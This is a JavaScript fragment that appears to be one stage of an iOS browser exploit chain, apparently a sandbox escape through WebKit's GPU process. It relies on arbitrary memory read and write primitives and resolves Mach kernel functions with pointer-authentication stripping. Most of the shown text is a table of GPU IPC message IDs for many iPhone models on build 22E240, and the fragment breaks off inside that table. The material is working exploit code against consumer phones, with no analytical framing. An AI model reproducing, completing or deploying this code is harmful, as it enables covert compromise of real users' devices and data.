(() => {
  const {
    write8,
    read32,
    read64,
    write64,
    dlopen,
    dlsym,
    device_model,
    chipset
  } = p;
  const libsystem_kernel = dlopen('/usr/lib/system/libsystem_kernel.dylib', 1n);
  const libsystem_platform = dlopen('/usr/lib/system/libsystem_platform.dylib', 1n);
  offsets.pthread_exit = dlsym(libsystem_pthread, 'pthread_exit').noPAC();
  offsets.pthread_setspecific = dlsym(libsystem_pthread, 'pthread_setspecific').noPAC();
  offsets.mach_port_allocate = dlsym(libsystem_kernel, 'mach_port_allocate').noPAC();
  offsets.mach_port_insert_right = dlsym(libsystem_kernel, 'mach_port_insert_right').noPAC();
  offsets.mach_msg_fn = dlsym(libsystem_kernel, 'mach_msg').noPAC();
  offsets.mach_make_memory_entry_64_fn = dlsym(libsystem_kernel, 'mach_make_memory_entry_64').noPAC();
  offsets.mach_vm_map_fn = dlsym(libsystem_kernel, 'mach_vm_map').noPAC();
  offsets.vm_allocate_fn = dlsym(libsystem_kernel, 'vm_allocate').noPAC();
  offsets.semaphore_signal = dlsym(libsystem_kernel, 'semaphore_signal').noPAC();
  offsets.memset = dlsym(libsystem_platform, '_platform_memset').noPAC();
  offsets.memcpy = dlsym(libsystem_platform, '_platform_memmove').noPAC();
  offsets.exit = dlsym(libsystem_kernel, '_exit').noPAC();
  sbx0_rw_begin = Date.now();
  sbx0_offsets = {
   "iPhone11,2_4_6_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone11,8_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone12,1_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone12,3_5_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone12,8_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone13,1_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone13,2_3_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone13,4_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone14,2_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone14,3_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone14,4_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone14,5_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone14,6_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
